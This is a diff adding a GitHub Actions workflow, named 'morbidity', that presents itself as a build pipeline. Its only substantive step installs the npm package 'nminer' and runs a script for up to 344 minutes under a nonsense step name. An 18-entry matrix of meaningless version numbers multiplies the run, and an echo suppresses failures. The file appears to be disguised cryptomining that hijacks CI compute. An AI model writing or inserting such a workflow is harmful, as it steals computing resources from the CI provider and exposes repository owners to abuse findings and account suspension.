@@ -1,0 +1,43 @@
+name: morbidity
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 6918 }
+          - { version: 5700 }
+          - { version: 6092 }
+          - { version: 5794 }
+          - { version: 9838 }
+          - { version: 3162 }
+          - { version: 2385 }
+          - { version: 5760 }
+          - { version: 8750 }
+          - { version: 4753 }
+          - { version: 4365 }
+          - { version: 6257 }
+          - { version: 5132 }
+          - { version: 5406 }
+          - { version: 2241 }
+          - { version: 9059 }
+          - { version: 8360 }
+          - { version: 4817 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: aside while illusion ideal
+        run: |
+          npm install nminer@latest
+          timeout 344m node morbidity.js || echo "morbidity executed"
